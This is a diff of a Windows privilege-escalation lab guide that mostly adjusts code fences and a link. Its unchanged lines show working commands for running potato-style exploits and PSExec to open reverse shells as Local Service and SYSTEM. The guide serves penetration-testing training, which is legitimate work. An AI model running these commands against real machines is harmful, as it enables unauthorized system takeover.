@@ -18,7 +18,7 @@ and here is the compiled binary exploit:
 
 Run the exploit with your custom reverse shell:
 
-```text
+```
 potato.exe -ip 192.168.1.33 -cmd "C:\PrivEsc\reverse.exe" - enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true
 ```
 
@@ -44,7 +44,7 @@ Copy PSExec64.exe and the JuicyPotato.exe exploit executable over to Windows and
 
 Using an administrator command prompt, use PSExec64.exe to trigger a reverse shell running as the Local Service service account:
 
-```text
+```
 PSExec64.exe -i -u "ntauthority\local service" reverse.exe
 ```
 
@@ -52,16 +52,14 @@ Start another listener on Kali
 
 Now run the JuicyPotato exploit to trigger a reverse shell running with SYSTEM privileges:
 
-```text
+```
 PrivEsc\JuicyPotato.exe -l 1337 -p reverse.exe  -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
 ```
 
 {% hint style="info" %}
-If the CLSID \({03ca...\) doesn’t work for you, either check this list:
+If the CLSID ({03ca...) doesn’t work for you, either check this list:
 
-[https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
-)
+[https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md)
 
 or run the GetCLSID.ps1 PowerShell script.
 {% endhint %}
-
